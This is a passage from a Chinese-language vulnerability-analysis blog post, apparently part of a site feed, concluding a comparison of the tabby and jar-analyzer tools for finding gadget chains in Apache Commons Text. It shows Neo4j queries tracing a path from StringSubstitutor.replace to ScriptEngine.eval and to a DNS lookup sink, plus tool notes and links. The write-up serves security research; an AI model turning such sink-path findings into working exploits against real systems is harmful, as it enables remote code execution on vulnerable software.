alt="img"></p><p>可以看到完整的链子已经出来了。说实话，跑的挺久的，可能我电脑太老了。</p><p>优化一下。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span><span class="hljs-number">0.</span><span class="hljs-number">.1</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span><br>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;substitute&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m2:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:ALIAS<span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m3:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m4:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;eval&quot;, CLASSNAME: &quot;javax.script.ScriptEngine&quot;&#125;) <span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542602613-79da88b3-c059-441d-bf99-b59f0bfaf660-20231213233845314.png" alt="img"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>jar-ayalyzer 分析单jar包比较好使，快是真的快，分析起来很流畅，多jar包还是用tabby。tabby使用起来，图形化很直观，就是跑sql语句太慢了（可能我电脑卡），可以分析多jar包，还有neo4j语句太难写了。（小孩才做选择，成人的世界就是全都要）</p><p>整体看来都很不错。只要source点，sink点就能一步步往上挖，这个时候，还是tabby比较好使，全跑出来，然后内眼看。</p><p>tabby内有许多定义好的sink点，很实用。</p><p><img src="1701542607981-a02aeb0e-0ff8-4651-b078-e463fd405ded-20231213233845517.png" alt="img"></p><p><img src="1701542612742-d3540034-16af-4c3a-af66-440aefcf3867-20231213233845511.png" alt="img"></p><p>这里没找到，应该是默认confg里面没有，所以没找到，所以有时候碰见了，可以写进去 ![image-<img src="t1701542618145-15a19937-f46f-41f7-85b0-57e5852bf347-20231213233845351.png" alt="img"></p><p><img src="1701542623492-1d3ae1a1-7d5c-4be1-88b8-97f733967e92-20231213233845516.png" alt="img"></p><p>自己写入sink点，可以成功查询到。</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">MATCH (source:Method &#123;NAME:<span class="hljs-string">&quot;replace&quot;</span>&#125;)<br>MATCH (sink:Method &#123;NAME:<span class="hljs-string">&quot;lookup&quot;</span>&#125;)&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]<br>                    -&gt;(cls1:Class &#123;NAME:<span class="hljs-string">&quot;org.apache.commons.text.lookup.StringLookup&quot;</span>&#125;)<br>MATCH (sink)-[:CALL*]-&gt;(m1:Method&#123;NAME:<span class="hljs-string">&quot;getByName&quot;</span>&#125;)<br>call tabby.beta.findPath(source,<span class="hljs-string">&quot;-&quot;</span>,sink,<span class="hljs-number">12</span>,<span class="hljs-literal">false</span>) YIELD path<br><span class="hljs-keyword">return</span> path<br></code></pre></td></tr></table></figure><p><img src="1701837000942-be1188d1-312e-4f4c-a196-ee15b1e274a0-20231213233845260.png" alt="img"></p><p>dns链</p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06  参考链接"></a>0x06  参考链接</h2><p><a href="https://github.com/wh1t3p1g/tabby">https://github.com/wh1t3p1g/tabby</a></p><p><a href="https://github.com/jar-analyzer/jar-analyzer">https://github.com/jar-analyzer/jar-analyzer</a></p><p><a href="https://www.anquanke.com/post/id/283625">https://www.anquanke.com/post/id/283625</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
